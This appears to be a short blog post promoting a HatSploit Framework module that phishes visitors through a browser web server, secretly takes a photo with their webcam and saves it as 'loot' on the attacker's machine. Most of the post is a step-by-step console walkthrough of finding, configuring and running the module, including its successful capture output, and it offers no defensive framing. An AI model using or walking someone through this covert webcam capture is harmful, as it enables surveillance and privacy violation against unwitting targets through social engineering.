---
layout: post
title: HatSploit breakthrough
subtitle: HatSploit Framework Webcam Photo Phishing
gh-repo: entysec/hatsploit
gh-badge: [star, fork]
tags: [hatsploit, fishing, module]
comments: false
---

Phishing is a way to access information through social engeneering for example. Attackers phish for credentials, password hashes, location and other important data.

EntySec implemented module to HatSploit Framework which is used to access target's webcam through browser, take photo and save it as loot on attacker's machine. This module called - `exploit/generic/gather/browser_webcam_photo`.

```
(hsf)> search -w modules webcam
 
Modules (modules):
 
    Number    Module                                         Rank    Name                           
    ------    ------                                         ----    ----                           
    0         exploit/generic/gather/browser_webcam_photo    high    Gather Browser Webcam Photo    
 
(hsf)>
```

All you need to do is to use this module within HatSploit Framework and set important options.

```
(hsf)> use 0
(hsf: exploit: Gather Browser Webcam Photo)> options
 
Module Options (exploit/generic/gather/browser_webcam_photo):
 
    Option     Value                                             Required    Description                      
    ------     -----                                             --------    -----------                      
    FILE       /Users/enty8080/.hsf/loot/pqpzIjGbYuP1pAZU.png    yes         File to save photo.              
    SRVHOST    0.0.0.0                                           yes         Host to start http server on.    
    SRVPORT    8080                                              yes         Port to start http server on.    
    URLPATH    /                                                 yes         File path on server.             
 
(hsf: exploit: Gather Browser Webcam Photo)>
```

Now, to start web server for phishing, run it and wait for connection.

```
(hsf: exploit: Gather Browser Webcam Photo)> run
 
[*] Starting HTTP listener on port 8080...
[*] Delivering payload...
[*] Taking webcam photo...
[*] Saving loot /Users/enty8080/.hsf/loot/pqpzIjGbYuP1pAZU.png...
[+] Loot successfully saved!
(hsf: exploit: Gather Browser Webcam Photo)>
```
